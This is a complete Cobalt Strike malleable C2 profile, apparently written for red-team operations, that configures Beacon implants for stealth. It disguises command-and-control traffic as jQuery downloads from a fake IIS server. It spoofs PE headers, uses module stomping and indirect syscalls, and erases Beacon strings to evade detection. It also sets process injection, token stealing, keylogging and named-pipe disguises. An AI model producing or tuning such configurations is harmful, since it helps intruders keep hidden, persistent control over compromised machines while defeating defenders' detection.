#
# Author: @gerbsec


################################################
## Profile Name
################################################
set sample_name "gerbfile";


################################################
## Sleep Times
################################################
set sleeptime "15000";         # 15 Seconds
set jitter    "57";            # % jitter


################################################
##  Server Response Size jitter
################################################
##  Description:
##   Append random-length string (up to data_jitter value) to http-get and http-post server output.
set data_jitter "100";

################################################
##  HTTP Client Header Removal
################################################
##  Description:
##      Global option to force Beacon's WinINet to remove specified headers late in the HTTP/S transaction process.
## Value:
##      headers_remove              Comma-separated list of HTTP client headers to remove from Beacon C2.
# set headers_remove "Strict-Transport-Security, header2, header3";

################################################
## Beacon User-Agent
################################################
## MS IE 11 User Agent
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36";

################################################
## SSL CERTIFICATE
################################################
## Description:
##    Signed or self-signed TLS/SSL Certifcate used for C2 communication using an HTTPS listener
## Defaults:
##    All certificate values are blank
## Guidelines:
##    - Best Option - Use a certifcate signed by a trusted certificate authority
##    - Ok Option - Create your own self signed certificate
##    - Option - Set self-signed certificate values
https-certificate {
# Self Signed Certificate Options
#       set CN       "*.azureedge.net";
#       set O        "Microsoft Corporation";
#       set C        "US";
#       set L        "Redmond";
#       set ST       "WA";
#       set OU       "Organizational Unit";
#       set validity "365";

# Imported Certificate Options
#        set keystore "domain.store";
#        set password "password";
}

################################################
## Task and Proxy Max Size
################################################
set tasks_max_size "2097152"; # Changed to 2 MB to support larger assembly files
set tasks_proxy_max_size "921600";
set tasks_dns_proxy_max_size "71680";

################################################
## HTTP Beacon
################################################
## Description:
##   Allows you to specify attributes for general attributes for the http(s) beacons.
## Values:
##
http-beacon {
    # Change the default HTTP Beacon library type used by the generated beacons
    set library "winhttp";
}

################################################
## TCP Beacon
################################################
## Guidelines
##    - OPSEC WARNING!!!!! The default port is 4444. This is bad. You can change dynamicaly but the port set in the profile will always be used first before switching to the dynamic port.
##    - Use a port other that default. Choose something not is use.
##    - Use a port greater than 1024 is generally a good idea
set tcp_port "42125";
#set tcp_frame_header "\x80";
#set tcp_frame_header "\x2d\x60\x6e\xbf\x1a\x15\x82\x63\x2b\x73\xc4\x91\x7a\x73\xa9\x33";
set tcp_frame_header "\x34\xe2\x00\x50\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\xff\xff\x7a\xcb\x00\x00";

################################################
## SMB beacons
################################################
set pipename         "Winsock2\\CatalogChangeListener-###-0";
set pipename_stager "crashpad_##_##";
set smb_frame_header "\xff\x53\x4d\x42\x2f\x00\x00\x00\x00\x18\x07\xc8\x00\x00\x40\x6d\x4e\xf4\x8c\x6e\x13\x7b\x00\x00\x00\x08\xff\xfe\x00\x08\x00\x01"; #https://vulners.com/exploitpack/EXPLOITPACK:9ED41CA2321582E709595A0F73CA35CC
## Guidelines:
##    - Do not use an existing namedpipe, Beacon doesn't check for conflict!
##    - the ## is replaced with a number unique to a teamserver 

################################################
## DNS beacons
################################################
dns-beacon {
    # Options moved into "dns-beacon" group in version 4.3
    set dns_idle           "74.125.196.113"; #google.com (change this to match your campaign)
    set dns_max_txt        "252";
    set dns_sleep          "0"; #    Force a sleep prior to each individual DNS request. (in milliseconds)
    set dns_ttl            "5";
    set maxdns             "255";
    set dns_stager_prepend ".resources.123456.";
    set dns_stager_subhost ".feeds.123456.";

    # DNS subhosts override options, added in version 4.3
    set beacon           "a.bc.";
    set get_A            "b.1a.";
    set get_AAAA         "c.4a.";
    set get_TXT          "d.tx.";
    set put_metadata     "e.md.";
    set put_output       "f.po.";
    set ns_response      "zero";

}

################################################
## SSH beacons
################################################
set ssh_banner        "OpenSSH_7.4 Debian (protocol 2.0)";
set ssh_pipename "SearchTextHarvester##";


set host_stage "false"; # Do not use staging. Must use stageles payloads, now the default for Cobalt Strike built-in processes


################################################
## Steal Token Access Mask
################################################
## Description:
##    Added in CS4.7
##    Allows you to set a default OpenProcessToken access mask used for steal_token and bsteal_token
## Defaults:
##    steal_token_access_mask "0";         # TOKEN_ALL_ACCESS
## Guidelines
##    - Suggested values: 0 = TOKEN_ALL_ACCESS or 11 = TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY (1+2+8)
##    - Can be helpful for stealing tokens from processes using 'SYSTEM' user and you have this error: Could not open process token: {pid} (5)
##    - Refer to
##       https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/post-exploitation_trust-relationships.htm
##
set steal_token_access_mask "11"; # TOKEN_ASSIGN_PRIMARY


###Post-Ex Block###
post-ex {
    set pipename "Winsock2\\CatalogChangeListener-###-0";
    set spawnto_x86 "%windir%\\syswow64\\wbem\\wmiprvse.exe -Embedding";
    set spawnto_x64 "%windir%\\sysnative\\wbem\\wmiprvse.exe -Embedding";
    set obfuscate "true";
    set smartinject "true";
    set cleanup "true";
    set keylogger "SetWindowsHookEx";
    set amsi_disable "false";
    set thread_hint "ntdll.dll!RtlUserThreadStart+0x1000";
    set keylogger "SetWindowsHookEx";
    
    transform-x64 {
        # replace a string in the port scanner dll
        strrepex "PortScanner" "Scanner module is complete" "Scan is complete";

        # replace a string in all post exploitation dlls
        strrep "is alive." "is up.";
    }

    transform-x86 {
        # replace a string in the port scanner dll
        strrepex "PortScanner" "Scanner module is complete" "Scan is complete";

        # replace a string in all post exploitation dlls
        strrep "is alive." "is up.";
    }
}

###Malleable PE/Stage Block###
stage {
    set allocator      "HeapAlloc"; # Options are: HeapAlloc, MapViewOfFile, and VirtualAlloc
    set magic_mz_x86   "OKKA";
    set magic_mz_x64   "OKKA";
    set magic_pe       "NE";
    set userwx         "false";
    set stomppe        "true";
    set obfuscate      "true";
    set cleanup        "true";
    # CS 3.12 Addition "Obfuscate and Sleep"
    set sleep_mask     "true";
    # CS 4.1
    set smartinject    "true";

    # Make the Beacon Reflective DLL look like something else in memory
    # Values captured using peclone agaist a Windows 10 version of explorer.exe
    set checksum       "0";
    set compile_time   "11 Nov 2016 04:08:32";
    set entry_point    "650688";
    set image_size_x86 "4661248";
    set image_size_x64 "4661248";
    set name           "WMNetMgr.DLL";
    # set rich_header    "\x3e\x98\xfe\x75\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x7a\xf9\x90\x26\x73\x81\x03\x26\xfc\xf9\x90\x26\x17\xa4\x93\x27\x79\xf9\x90\x26\x7a\xf9\x91\x26\x83\xfd\x90\x26\x17\xa4\x91\x27\x65\xf9\x90\x26\x17\xa4\x95\x27\x77\xf9\x90\x26\x17\xa4\x94\x27\x6c\xf9\x90\x26\x17\xa4\x9e\x27\x56\xf8\x90\x26\x17\xa4\x6f\x26\x7b\xf9\x90\x26\x17\xa4\x92\x27\x7b\xf9\x90\x26\x52\x69\x63\x68\x7a\xf9\x90\x26\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    set rich_header    "\x35\xe0\x65\x56\x71\x81\x0b\x05\x71\x81\x0b\x05\x71\x81\x0b\x05\x2a\xe9\x08\x04\x72\x81\x0b\x05\x2a\xe9\x0f\x04\x66\x81\x0b\x05\x71\x81\x0a\x05\xf7\x80\x0b\x05\x2a\xe9\x0a\x04\x7c\x81\x0b\x05\x2a\xe9\x0e\x04\x79\x81\x0b\x05\x2a\xe9\x0b\x04\x70\x81\x0b\x05\x2a\xe9\x05\x04\xb9\x81\x0b\x05\x2a\xe9\xf4\x05\x70\x81\x0b\x05\x2a\xe9\x09\x04\x70\x81\x0b\x05\x52\x69\x63\x68\x71\x81\x0b\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    ## WARNING: Module stomping
    # Cobalt Strike 3.11 also adds module stomping to Beacon's Reflective Loader. When enabled, Beacon's loader will shun VirtualAlloc and instead load a DLL into the current process and overwrite its memory.
    # Set module_x86 to a favorite x86 DLL to module stomp with the x86 Beacon. The module_x64 option enables this for the x64 Beacon.
    # While this is a powerful feature, caveats apply! If the library you load is not large enough to host Beacon, you will crash Beacon's process. If the current process loads the same library later (for whatever reason), you will crash Beacon's process. Choose carefully.
    # By default, Beacon's loader allocates memory with VirtualAlloc. Module stomping is an alternative to this. Set module_x86 to a DLL that is about twice as large as the Beacon payload itself. Beacon's x86 loader will load the specified DLL, find its location in memory, and overwrite it. This is a way to situate Beacon in memory that Windows associates with a file on disk. It's important that the DLL you choose is not needed by the applications you intend to reside in. The module_x64 option is the same story, but it affects the x64 Beacon.
    # Details can be found in the In-memory Evasion video series. https://youtu.be/uWVH9l2GMw4


    set module_x86 "wwanmm.dll";
    set module_x64 "wwanmm.dll";


    set syscall_method "Indirect";

    transform-x86 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
        strrep "ReflectiveLoader" "";
        strrep "This program cannot be run in DOS mode" "";
        strrep "NtQueueApcThread" "";
        strrep "HTTP/1.1 200 OK" "";
        strrep "Stack memory was corrupted" "";
        strrep "beacon.dll" "";
        strrep "ADVAPI32.dll" "";
        strrep "WININET.dll" "";
        strrep "WS2_32.dll" "";
        strrep "DNSAPI.dll" "";
        strrep "Secur32.dll" "";
        strrep "VirtualProtectEx" "";
        strrep "VirtualProtect" "";
        strrep "VirtualAllocEx" "";
        strrep "VirtualAlloc" "";
        strrep "VirtualFree" "";
        strrep "VirtualQuery" "";
        strrep "RtlVirtualUnwind" "";
        strrep "sAlloc" "";
        strrep "FlsFree" "";
        strrep "FlsGetValue" "";
        strrep "FlsSetValue" "";
        strrep "InitializeCriticalSectionEx" "";
        strrep "CreateSemaphoreExW" "";
        strrep "SetThreadStackGuarantee" "";
        strrep "CreateThreadpoolTimer" "";
        strrep "SetThreadpoolTimer" "";
        strrep "WaitForThreadpoolTimerCallbacks" "";
        strrep "CloseThreadpoolTimer" "";
        strrep "CreateThreadpoolWait" "";
        strrep "SetThreadpoolWait" "";
        strrep "CloseThreadpoolWait" "";
        strrep "FlushProcessWriteBuffers" "";
        strrep "FreeLibraryWhenCallbackReturns" "";
        strrep "GetCurrentProcessorNumber" "";
        strrep "GetLogicalProcessorInformation" "";
        strrep "CreateSymbolicLinkW" "";
        strrep "SetDefaultDllDirectories" "";
        strrep "EnumSystemLocalesEx" "";
        strrep "CompareStringEx" "";
        strrep "GetDateFormatEx" "";
        strrep "GetLocaleInfoEx" "";
        strrep "GetTimeFormatEx" "";
        strrep "GetUserDefaultLocaleName" "";
        strrep "IsValidLocaleName" "";
        strrep "LCMapStringEx" "";
        strrep "GetCurrentPackageId" "";
        strrep "UNICODE" "";
        strrep "UTF-8" "";
        strrep "UTF-16LE" "";
        strrep "MessageBoxW" "";
        strrep "GetActiveWindow" "";
        strrep "GetLastActivePopup" "";
        strrep "GetUserObjectInformationW" "";
        strrep "GetProcessWindowStation" "";
        strrep "Sunday" "";
        strrep "Monday" "";
        strrep "Tuesday" "";
        strrep "Wednesday" "";
        strrep "Thursday" "";
        strrep "Friday" "";
        strrep "Saturday" "";
        strrep "January" "";
        strrep "February" "";
        strrep "March" "";
        strrep "April" "";
        strrep "June" "";
        strrep "July" "";
        strrep "August" "";
        strrep "September" "";
        strrep "October" "";
        strrep "November" "";
        strrep "December" "";
        strrep "MM/dd/yy" "";
        strrep "Stack memory around _alloca was corrupted" "";
        strrep "Unknown Runtime Check Error" "";
        strrep "Unknown Filename" "";
        strrep "Unknown Module Name" "";
        strrep "Run-Time Check Failure #%d - %s" "";
        strrep "Stack corrupted near unknown variable" "";
        strrep "Stack pointer corruption" "";
        strrep "Cast to smaller type causing loss of data" "";
        strrep "Stack memory corruption" "";
        strrep "Local variable used before initialization" "";
        strrep "Stack around _alloca corrupted" "";
        strrep "RegOpenKeyExW" "";
        strrep "egQueryValueExW" "";
        strrep "RegCloseKey" "";
        strrep "LibTomMath" "";
        strrep "Wow64DisableWow64FsRedirection" "";
        strrep "Wow64RevertWow64FsRedirection" "";
        strrep "Kerberos" "";
        strrep "PDBOpenValidate5" "";
        strrep "msvcrt.dll" "";
        strrep "C:\\Windows\\System32\\msvcrt.dll" "";
        }

    transform-x64 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
        # prepend "\x66\x90\x0f\x1f\x00\x42\x0f\x1f\x00\x66\x87\xd2\x0f\x1f\x04\x00\x45\x47\x44\x40\x43\x90\x66\x87\xdb\x87\xd2\x66\x0f\x1f\x04\x00\x66\x87\xc9\x41\x0f\x1f\x00\x87\xdb\x49\x48\x40\x46\x87\xc9\x4c";
        strrep "A cast to a smaller data type has caused a loss of data" "";
        strrep "A cast to a smaller data type has caused a loss of data.  If this was intentional, you should mask the source of the cast with the appropriate bitmask.  For example:" "";
        strrep "(admin)" "(adm)";
        strrep "ADVAPI32.dll" "";
        strrep "A local variable was used before it was initialized" "";
        strrep "April" "";
        strrep "August" "";
        strrep "beacon.dll" "";
        strrep "beacon.x64.dll" "";
        strrep "Cast to smaller type causing loss of data" "";
        strrep "Changing the code in this way will not affect the quality of the resulting optimized code." "";
        strrep "char c = (i & 0xFF);" "";
        strrep "CloseThreadpoolTimer" "";
        strrep "CloseThreadpoolWait" "";
        strrep "CompareStringEx" "";
        strrep "Content-Length:" "";
        strrep "Content-Type: application/octet-stream" "";
        strrep "CorExitProcess" "";
        strrep "CreateSemaphoreExW" "";
        strrep "CreateSymbolicLinkW" "";
        strrep "CreateThreadpoolTimer" "";
        strrep "CreateThreadpoolWait" "";
        strrep "C:\\Windows\\System32\\msvcrt.dll" "";
        strrep "December" "";
        strrep "DNSAPI.dll" "";
        strrep "egQueryValueExW" "";
        strrep "EnumSystemLocalesEx" "";
        strrep "February" "";
        strrep "FlsFree" "";
        strrep "FlsGetValue" "";
        strrep "FlsSetValue" "";
        strrep "FlushProcessWriteBuffers" "";
        strrep "For example" "";
        strrep "For example:" "";
        strrep "FreeLibraryWhenCallbackReturns" "";
        strrep "Friday" "";
        strrep "GetActiveWindow" "";
        strrep "GetCurrentPackageId" "";
        strrep "GetCurrentProcessorNumber" "";
        strrep "GetDateFormatEx" "";
        strrep "GetLastActivePopup" "";
        strrep "GetLocaleInfoEx" "";
        strrep "GetLogicalProcessorInformation" "";
        strrep "GetProcessWindowStation" "";
        strrep "GetTimeFormatEx" "";
        strrep "GetUserDefaultLocaleName" "";
        strrep "GetUserObjectInformationW" "";
        strrep "HTTP/1.1 200 OK" "";
        strrep "If this was intentional, you should mask the source of the cast with the appropriate bitmask" "";
        strrep "InitializeCriticalSectionEx" "";
        strrep "is being used without being initialized." "";
        strrep "IsValidLocaleName" "";
        strrep "January" "";
        strrep "July" "";
        strrep "June" "";
        strrep "Kerberos" "";
        strrep "kernel32" "";
        strrep "LCMapStringEx" "";
        strrep "LibTomMath" "";
        strrep "Local variable used before initialization" "";
        strrep "March" "";
        strrep "MessageBoxW" "";
        strrep "MM/dd/yy" "";
        strrep "Monday" "";
        strrep "msvcrt.dll" "";
        strrep "netshell.dll" "";
        strrep "November" "";
        strrep "NtAllocateVirtualMemory" "";
        strrep "NtMapViewOfSection" "";
        strrep "NtQueueApcThread" "";
        strrep "NtWriteProcessMemory" "";
        strrep "October" "";
        strrep "operator" "";
        strrep "operator<=>" "";
        strrep "operator co_await" "";
        strrep "program cannot be run in DOS mode" "";
        strrep "ReflectiveLoader" "";
        strrep "RegCloseKey" "";
        strrep "RegOpenKeyExW" "";
        strrep "RegQueryValueExW" "";
        strrep "RtlCreateUserThread" "";
        strrep "RtlVirtualUnwind" "";
        strrep "Run-Time Check Failure" "";
        strrep "Run-Time Check Failure #%d - %s" "";
        strrep "sAlloc" "";
        strrep "%s as %s\\%s: %d" "%s - %s\\%s: %d";
        strrep "Saturday" "";
        strrep "Secur32.dll" "";
        strrep "September" "";
        strrep "SetDefaultDllDirectories" "";
        strrep "SetThreadpoolTimer" "";
        strrep "SetThreadpoolWait" "";
        strrep "SetThreadStackGuarantee" "";
        strrep "Stack around _alloca corrupted" "";
        strrep "Stack around" "corrupted";
        strrep "Stack around the variable" "";
        strrep "Stack corrupted near unknown variable" "";
        strrep "Stack memory around _alloca was corrupted" "";
        strrep "Stack memory corruption" "";
        strrep "Stack memory was corrupted" "";
        strrep "Stack pointer corruption" "";
        strrep "Sunday" "";
        strrep "The value of ESP was not properly saved across a function call." "";
        strrep "The value of ESP was not properly saved across a function call.  This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
        strrep "The variable" "";
        strrep "This is usually a result of calling a function declared with one calling convention with a function pointer declared" "";
        strrep "This program cannot be run in DOS mode" "";
        strrep "Thursday" "";
        strrep "Tuesday" "";
        strrep "UNICODE" "";
        strrep "Unknown Filename" "";
        strrep "Unknown Module Name" "";
        strrep "Unknown Runtime Check Error" "";
        strrep "UTF-16LE" "";
        strrep "UTF-8" "";
        strrep "VirtualAlloc" "";
        strrep "VirtualAllocEx" "";
        strrep "VirtualFree" "";
        strrep "VirtualProtect" "";
        strrep "VirtualProtectEx" "";
        strrep "VirtualQuery" "";
        strrep "WaitForThreadpoolTimerCallbacks" "";
        strrep "was corrupted." "";
        strrep "Wednesday" "";
        strrep "WININET.dll" "";
        strrep "Wow64DisableWow64FsRedirection" "";
        strrep "Wow64RevertWow64FsRedirection" "";
        strrep "WS2_32.dll" "";
        }
}

###Process Inject Block###
process-inject {
    set allocator "NtMapViewOfSection";
    set bof_allocator "MapViewOfFile";
    #set bof_allocator "VirtualAlloc";
    set bof_reuse_memory "false";
    set min_alloc "16700";
    set userwx "false";  
    set startrwx "false";
        
    transform-x86 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
    }
    transform-x64 {
        prepend "\x44\x40\x4B\x43\x4C\x48\x90\x66\x90\x0F\x1F\x00\x66\x0F\x1F\x04\x00\x0F\x1F\x04\x00\x0F\x1F\x00\x0F\x1F\x00";
    }

    execute {
        #CreateThread;
        #CreateRemoteThread;       
        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";
        SetThreadContext;
        NtQueueApcThread-s;
        #NtQueueApcThread;
        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        #CreateRemoteThread;
        RtlCreateUserThread;
    }
}


################################################
## Maleable C2
## https://www.cobaltstrike.com/help-malleable-c2#options
################################################
## HTTP Headers
################################################
## Description:
##    The http-config block has influence over all HTTP responses served by Cobalt Strike�s web server. Here, you may specify additional HTTP headers and the HTTP header order.
## Values:
##    set headers                   "Comma separated list of headers"    The set headers option specifies the order these HTTP headers are delivered in an HTTP response. Any headers not in this list are added to the end.
##    header                        "headername" "header alue            The header keyword adds a header value to each of Cobalt Strike's HTTP responses. If the header value is already defined in a response, this value is ignored.
##    set trust_x_forwarded_for     "true"                               Adds this header to determine remote address of a request.
##    block_useragents              "curl*,lynx*,wget*"                  Default useragents that are blocked
## Guidelines:
##    - Use this section in addition to the "server" secion in http-get and http-post to further define the HTTP headers
http-config {
    set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
    header "Server" "Microsoft-IIS/10.0";
    header "Keep-Alive" "timeout=10, max=100";
    header "Connection" "Keep-Alive";
    # Use this option if your teamserver is behind a redirector
    set trust_x_forwarded_for "true";
    # Block Specific User Agents with a 404 (added in 4.3)
    #set block_useragents "curl*,lynx*,wget*";
}

################################################
## HTTP GET
################################################
http-get {


    set uri "/jquery/user/preferences"; # URI used for GET requests
    set verb "GET";


    client {

        header "Accept" "image/*, application/json, text/html";
        header "Accept-Language" "nb";
        header "Accept-Encoding" "br, compress";
        header "Access-X-Control" "True";


        metadata {

            mask; # Transform type
            base64url; # Transform type
            prepend "SESSIONID_XVQD0C55VSGX3JM="; # Cookie value
            header "Cookie";                                  # Cookie header

        }

    }


    server {

        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";

        output {

            mask; # Transform type

            base64url; # Transform type

            prepend "/*! jQuery v2.2.4 | (c) jQuery Foundation | jquery.org/license */    !function(a,b){'object'==typeof module&&'object'==typeof module.exp    orts?module.exports=a.document?b(a,!0):function(a){if(!a.document)th    row new Error('jQuery requires a window with a document');return b(a    )}:b(a)}('undefined'!=typeof window?window:this,function(a,b){var c=    [],d=a.document,e=c.slice,f=c.concat,g=c.push,h=c.indexOf,i={},j=i.t    oString,k=i.hasOwnProperty,l={},m='2.2.4',n=function(a,b){return new     n.fn.init(a,b)},o=/^[suFEFFxA0]+|[suFEFFxA0]+$/g,p=/^-ms-/,q=/-    ([da-z])/gi,r=function(a,b){return b.toUpperCase()};n.fn=n.prototype    ={jquery:m,constructor:n,selector:'',length:0,toArray:function(){retu    rn e.call(this)},get:function(a){return null!=a?0>a?this[a+this.lengt    h]:this[a]:e.call(this)},pushStack:function(a){var b=n.merge(this.con    structor(),a);return b.prevObject=this,b.context=this.context,b},each:";

            append "/*! jQuery v3.4.1 | (c) JS Foundation and other contributors | jquery.org/license */    !function(e,t){'use strict';'object'==typeof module&&'object'==typeof module.exports?    module.exports=e.document?t(e,!0):function(e){if(!e.document)throw new Error('jQuery     requires a window with a document');return t(e)}:t(e)}('undefined'!=typeof window?window    :this,function(C,e){'use strict';var t=[],E=C.document,r=Object.getPrototypeOf,s=t.slice    ,g=t.concat,u=t.push,i=t.indexOf,n={},o=n.toString,v=n.hasOwnProperty,a=v.toString,l=    a.call(Object),y={},m=function(e){return'function'==typeof e&&'number'!=typeof e.nodeType}    ,x=function(e){return null!=e&&e===e.window},c={type:!0,src:!0,nonce:!0,noModule:!0};fun    ction b(e,t,n){var r,i,o=(n=n||E).createElement('script');if(o.text=e,t)for(r in c)(i=t[    r]||t.getAttribute&&t.getAttribute(r))&&o.setAttribute(r,i);n.head.appendChild(o).parentNode;";

            print;

        }


    }

}

################################################
## HTTP POST
################################################
http-post {

    set uri "/api/v2/jquery/settings/update"; # URI used for POST block.
    set verb "POST"; # HTTP verb used in POST block. Can be GET or POST


    client {

        header "Accept" "application/xml, application/xhtml+xml, application/json";
        header "Accept-Language" "tn";
        header "Accept-Encoding" "identity, *";
        header "Access-X-Control" "True";


        id {

            mask; # Transform type
            netbiosu; # Transform type
            parameter "_KZZUEUVN";

        }


        output {

            mask; # Transform type
            netbios; # Transform type
            print;

        }

    }


    server {

        header "Server" "Microsoft-IIS/10.0";
        header "X-Powered-By" "ASP.NET";
        header "Cache-Control" "max-age=0, no-cache";
        header "Pragma" "no-cache";
        header "Connection" "keep-alive";
        header "Content-Type" "application/javascript; charset=utf-8";


        output {

            mask; # Transform type

            netbiosu; # Transform type

            prepend "/*! jQuery UI - v1.12.1 - 2016-09-14    * http://jqueryui.com    * Includes: widget.js, position.js,    data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js    , effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect    -fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effe    cts/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-s    ize.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix    in.js, jquery-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js,    widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.    js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable    .js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, w    idgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, w    idgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js    * Copyright jQuery Foundation and other contributors; Licensed MIT */";

            append "/*! jQuery UI - v1.12.1 - 2016-09-14    * http://jqueryui.com    * Includes: widget.js, position.js,    data.js, disable-selection.js, effect.js, effects/effect-blind.js, effects/effect-bounce.js    , effects/effect-clip.js, effects/effect-drop.js, effects/effect-explode.js, effects/effect    -fade.js, effects/effect-fold.js, effects/effect-highlight.js, effects/effect-puff.js, effe    cts/effect-pulsate.js, effects/effect-scale.js, effects/effect-shake.js, effects/effect-s    ize.js, effects/effect-slide.js, effects/effect-transfer.js, focusable.js, form-reset-mix    in.js, jquery-1-7.js, keycode.js, labels.js, scroll-parent.js, tabbable.js, unique-id.js,    widgets/accordion.js, widgets/autocomplete.js, widgets/button.js, widgets/checkboxradio.    js, widgets/controlgroup.js, widgets/datepicker.js, widgets/dialog.js, widgets/draggable    .js, widgets/droppable.js, widgets/menu.js, widgets/mouse.js, widgets/progressbar.js, w    idgets/resizable.js, widgets/selectable.js, widgets/selectmenu.js, widgets/slider.js, w    idgets/sortable.js, widgets/spinner.js, widgets/tabs.js, widgets/tooltip.js    * Copyright jQuery Foundation and other contributors; Licensed MIT */";

            print;


        }

    }

}
